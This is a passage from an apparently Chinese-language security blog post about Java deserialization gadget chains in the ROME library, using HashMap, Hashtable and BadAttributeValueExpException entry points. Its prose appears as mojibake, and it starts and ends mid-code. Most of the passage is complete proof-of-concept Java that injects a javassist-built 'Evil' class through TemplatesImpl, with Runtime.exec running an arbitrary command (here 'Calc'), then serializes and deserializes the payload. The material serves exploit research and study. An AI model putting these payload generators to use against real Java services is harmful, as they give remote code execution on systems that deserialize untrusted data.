bytecodesField.setAccessible(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[] code = RunCommand(<span class="string">&quot;Calc&quot;</span>);</span><br><span class="line">        <span class="type">byte</span>[][] codes = &#123;code&#125;;</span><br><span class="line">        bytecodesField.set(templates,codes);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">tfactoryField</span> <span class="operator">=</span> c1.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">        tfactoryField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        tfactoryField.set(templates, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line"><span class="comment">//        templates.newTransformer();</span></span><br><span class="line"></span><br><span class="line">        <span class="type">ToStringBean</span> <span class="variable">toStringBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ToStringBean</span>(Templates.class, templates);</span><br><span class="line"><span class="comment">//        toStringBean.toString();</span></span><br><span class="line"></span><br><span class="line">        <span class="type">ObjectBean</span> <span class="variable">objectBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectBean</span>(ToStringBean.class, toStringBean);</span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object,Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;(<span class="number">1</span>);</span><br><span class="line">        hashMap.put(<span class="string">&quot;key&quot;</span>,<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line"></span><br><span class="line">        Object[] tables= (Object[]) getValue(hashMap,<span class="string">&quot;table&quot;</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">new_tables</span> <span class="operator">=</span> tables[<span class="number">0</span>];</span><br><span class="line">        setValue(new_tables,<span class="string">&quot;key&quot;</span>,objectBean);</span><br><span class="line"></span><br><span class="line">        serialize(hashMap);</span><br><span class="line">        unseralize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] RunCommand(String cmd) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">            <span class="type">CtClass</span> <span class="variable">ctClass</span> <span class="operator">=</span> pool.makeClass(<span class="string">&quot;Evil&quot;</span>);</span><br><span class="line">            <span class="type">CtClass</span> <span class="variable">superClass</span> <span class="operator">=</span> pool.get(<span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;</span>);</span><br><span class="line">            ctClass.setSuperclass(superClass);</span><br><span class="line">            <span class="type">CtConstructor</span> <span class="variable">constructor</span> <span class="operator">=</span> ctClass.makeClassInitializer();</span><br><span class="line">            constructor.setBody(<span class="string">&quot; try &#123;\n&quot;</span> +</span><br><span class="line">                    <span class="string">&quot; Runtime.getRuntime().exec(\&quot;&quot;</span> + cmd +</span><br><span class="line">                    <span class="string">&quot;\&quot;);\n&quot;</span> +</span><br><span class="line">                    <span class="string">&quot; &#125; catch (Exception ignored) &#123;\n&quot;</span> +</span><br><span class="line">                    <span class="string">&quot; &#125;&quot;</span>);</span><br><span class="line">            <span class="type">byte</span>[] bytes = ctClass.toBytecode();</span><br><span class="line">            ctClass.defrost();</span><br><span class="line">            <span class="keyword">return</span> bytes;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">byte</span>[]&#123;&#125;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setValue</span><span class="params">(Object obj, String name, Object value)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(name);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">getValue</span><span class="params">(Object obj, String name)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(name);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="keyword">return</span> field.get(obj);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object object)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">fos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">os</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fos);</span><br><span class="line">        os.writeObject(object);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unseralize</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">FileInputStream</span> <span class="variable">fis</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(Filename);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">oi</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(fis);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">object</span> <span class="operator">=</span> oi.readObject();</span><br><span class="line">        <span class="keyword">return</span> object;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">base64Encode</span><span class="params">(<span class="keyword">final</span> <span class="type">byte</span>[] bytes)</span> &#123;</span><br><span class="line">        <span class="keyword">final</span> Base64.<span class="type">Encoder</span> <span class="variable">encoder</span> <span class="operator">=</span> Base64.getEncoder();</span><br><span class="line">        <span class="keyword">return</span> encoder.encodeToString(bytes);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object object, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> object.getClass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> clazz.getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(object,value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/gh0st-9/images/image/image-20221116192317879.png" alt="image-20221116192317879"></p><h3 id="HashTableé“¾"><a href="#HashTableé“¾" class="headerlink" title="HashTableé“¾"></a>HashTableé“¾</h3><p>æ›¿æ¢HashMapä½œä¸ºå…¥å£é“¾</p><p><code>HashMap.readObject()</code>ä¸­ï¼Œéå†æ‰€æœ‰keyå€¼è°ƒç”¨äº†<code>reconstitutionPut</code></p><p><img src="https://cdn.jsdelivr.net/gh/gh0st-9/images/image/image-20221116192332026.png" alt="image-20221116192332026"></p><p>è·Ÿè¿›ï¼Œå¯ä»¥çœ‹åˆ°æœ€ç»ˆè¿˜æ˜¯è°ƒç”¨ä»»æ„ç±»çš„hashCodeæ–¹æ³•</p><p><img src="https://cdn.jsdelivr.net/gh/gh0st-9/images/image/image-20221116192325740.png" alt="image-20221116192325740"></p><p><strong>gadget</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">HashTable.readObject(ObjectInputStream)</span><br><span class="line">HashTable.reconstitutionPut(Entry)</span><br><span class="line">ObjectBean.hashCode()</span><br><span class="line">EqualsBean.beanHashCode()</span><br><span class="line">ToStringBean.toString()</span><br><span class="line">ToStringBean.toString(String)</span><br><span class="line">TemplatesImpl.getOutputProperties()</span><br></pre></td></tr></table></figure><p><strong>poc</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.syndication.feed.impl.ObjectBean;</span><br><span class="line"><span class="keyword">import</span> com.sun.syndication.feed.impl.ToStringBean;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> javassist.CtConstructor;</span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.Hashtable;</span><br><span class="line"></span><br><span class="line"><span class="meta">@SuppressWarnings(value = &quot;all&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HashtableGadget</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="type">Class</span> <span class="variable">c1</span> <span class="operator">=</span> templates.getClass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">nameField</span> <span class="operator">=</span> c1.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        nameField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        nameField.set(templates,<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">bytecodesField</span> <span class="operator">=</span> c1.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        bytecodesField.setAccessible(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[] code = RunCommand(<span class="string">&quot;Calc&quot;</span>);</span><br><span class="line">        <span class="type">byte</span>[][] codes = &#123;code&#125;;</span><br><span class="line">        bytecodesField.set(templates,codes);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">tfactoryField</span> <span class="operator">=</span> c1.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">        tfactoryField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        tfactoryField.set(templates, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line"><span class="comment">//        templates.newTransformer();</span></span><br><span class="line"></span><br><span class="line">        <span class="type">ToStringBean</span> <span class="variable">toStringBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ToStringBean</span>(Templates.class, templates);</span><br><span class="line"><span class="comment">//        toStringBean.toString();</span></span><br><span class="line"></span><br><span class="line">        <span class="type">ObjectBean</span> <span class="variable">objectBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectBean</span>(ToStringBean.class, toStringBean);</span><br><span class="line"></span><br><span class="line">        Hashtable&lt;Object, Object&gt; hashTable = <span class="keyword">new</span> <span class="title class_">Hashtable</span>&lt;&gt;();</span><br><span class="line">        hashTable.put(objectBean,<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] RunCommand(String cmd) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">            <span class="type">CtClass</span> <span class="variable">ctClass</span> <span class="operator">=</span> pool.makeClass(<span class="string">&quot;Evil&quot;</span>);</span><br><span class="line">            <span class="type">CtClass</span> <span class="variable">superClass</span> <span class="operator">=</span> pool.get(<span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;</span>);</span><br><span class="line">            ctClass.setSuperclass(superClass);</span><br><span class="line">            <span class="type">CtConstructor</span> <span class="variable">constructor</span> <span class="operator">=</span> ctClass.makeClassInitializer();</span><br><span class="line">            constructor.setBody(<span class="string">&quot; try &#123;\n&quot;</span> +</span><br><span class="line">                    <span class="string">&quot; Runtime.getRuntime().exec(\&quot;&quot;</span> + cmd +</span><br><span class="line">                    <span class="string">&quot;\&quot;);\n&quot;</span> +</span><br><span class="line">                    <span class="string">&quot; &#125; catch (Exception ignored) &#123;\n&quot;</span> +</span><br><span class="line">                    <span class="string">&quot; &#125;&quot;</span>);</span><br><span class="line">            <span class="type">byte</span>[] bytes = ctClass.toBytecode();</span><br><span class="line">            ctClass.defrost();</span><br><span class="line">            <span class="keyword">return</span> bytes;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">byte</span>[]&#123;&#125;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setValue</span><span class="params">(Object obj, String name, Object value)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(name);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">getValue</span><span class="params">(Object obj, String name)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(name);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="keyword">return</span> field.get(obj);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object object)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">fos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">os</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fos);</span><br><span class="line">        os.writeObject(object);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">FileInputStream</span> <span class="variable">fis</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(Filename);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">oi</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(fis);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">object</span> <span class="operator">=</span> oi.readObject();</span><br><span class="line">        <span class="keyword">return</span> object;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object object, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> object.getClass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> clazz.getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(object,value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/gh0st-9/images/image/image-20221116192339535.png" alt="image-20221116192339535"></p><p>ä½†è¿™é‡Œä¹Ÿå­˜åœ¨åŒæ ·ä¸€ä¸ªé—®é¢˜ï¼Œå¦‚æœç›´æ¥putçš„è¯è¿˜æ˜¯ä¼šæå‰è°ƒç”¨ä¸€æ¬¡key.hashCodeï¼Œå€’ç½®åºåˆ—åŒ–æ—¶ä¼šåŠ è½½ä¸€æ¬¡æ¶æ„å­—èŠ‚ç ï¼Œæ‰€ä»¥æœ€ä¼˜åŒ–çš„æ–¹æ¡ˆåº”è¯¥è¿˜æ˜¯éœ€è¦åå°„æ”¹keyå€¼ï¼Œä½†è¿™é‡Œä¸æ¸…æ¥šhashCodeçš„æ„é€ ï¼Œä¸€ç›´æ²¡æ”¹æˆåŠŸ:(,å¸Œæœ›æœ‰å¸ˆå‚…æŒ‡ç‚¹ä¸€ä¸‹o.0</p><p><img src="https://cdn.jsdelivr.net/gh/gh0st-9/images/image/image-20221116192344745.png" alt="image-20221116192344745"></p><h3 id="BadAttributeValueExpExceptioné“¾"><a href="#BadAttributeValueExpExceptioné“¾" class="headerlink" title="BadAttributeValueExpExceptioné“¾"></a>BadAttributeValueExpExceptioné“¾</h3><p>æåˆ°<code>toString()</code>ï¼Œä¸éš¾æƒ³åˆ°cc5ä¸­<code>BadAttributeValueExpException</code>çš„ç»å…¸è°ƒç”¨<code>toString()</code></p><p><strong>gadget</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">BadAttributeValueExpException.readObject()</span><br><span class="line">ToStringBean.toString()</span><br><span class="line">ToStringBean.toString(String)</span><br><span class="line">TemplatesImpl.getOutputProperties()</span><br></pre></td></tr></table></figure><p><strong>poc</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.syndication.feed.impl.ToStringBean;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> javassist.CtConstructor;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.management.BadAttributeValueExpException;</span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"></span><br><span class="line"><span class="meta">@SuppressWarnings(value = &quot;all&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">BadAttributeValueExpExceptionGadget</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="type">Class</span> <span class="variable">c1</span> <span class="operator">=</span> templates.getClass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">nameField</span> <span class="operator">=</span> c1.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        nameField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        nameField.set(templates,<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">bytecodesField</span> <span class="operator">=</span> c1.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        bytecodesField.setAccessible(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[] code = RunCommand(<span class="string">&quot;Calc&quot;</span>);</span><br><span class="line">        <span class="type">byte</span>[][] codes = &#123;code&#125;;</span><br><span class="line">        bytecodesField.set(templates,codes);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">tfactoryField</span> <span class="operator">=</span> c1.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">        tfactoryField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        tfactoryField.set(templates, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line"><span class="comment">//        templates.newTransformer();</span></span><br><span class="line"></span><br><span class="line">        <span class="type">ToStringBean</span> <span class="variable">toStringBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ToStringBean</span>(Templates.class, templates);</span><br><span class="line"><span class="comment">//        toStringBean.toString();</span></span><br><span class="line"></span><br><span class="line">        <span class="type">BadAttributeValueExpException</span> <span class="variable">badAttributeValueExpException</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BadAttributeValueExpException</span>(<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line"></span><br><span class="line">        setValue(badAttributeValueExpException,<span class="string">&quot;val&quot;</span>,toStringBean);</span><br><span class="line"></span><br><span class="line">        serialize(badAttributeValueExpException);</span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] RunCommand(String cmd) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">            <span class="type">CtClass</span> <span class="variable">ctClass</span> <span class="operator">=</span> pool.makeClass(<span class="string">&quot;Evil&quot;</span>);</span><br><span class="line">            <span class="type">CtClass</span> <span class="variable">superClass</span> <span class="operator">=</span> pool.get(<span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;</span>);</span><br><span class="line">            ctClass.setSuperclass(superClass);</span><br><span class="line">            <span class="type">CtConstructor</span> <span class="variable">constructor</span> <span class="operator">=</span> ctClass.makeClassInitializer();</span><br><span class="line">            constructor.setBody(<span class="string">&quot; try &#123;\n&quot;</span> +</span><br><span class="line">                    <span class="string">&quot; Runtime.getRuntime().exec(\&quot;&quot;</span> + cmd +</span><br><span class="line">                    <span class="string">&quot;\&quot;);\n&quot;</span> +</span><br><span class="line">                    <span class="string">&quot; &#125; catch (Exception ignored) &#123;\n&quot;</span> +</span><br><span class="line">                    <span class="string">&quot; &#125;&quot;</span>);</span><br><span class="line">            <span class="type">byte</span>[] bytes = ctClass.toBytecode();</span><br><span class="line">            ctClass.defrost();</span><br><span class="line">            <span class="keyword">return</span> bytes;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">byte</span>[]&#123;&#125;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setValue</span><span class="params">(Object obj, String name, Object value)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(name);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">getValue</span><span class="params">(Object obj, String name)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(name);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="keyword">return</span> field.get(obj);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object object)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">fos</span> <span 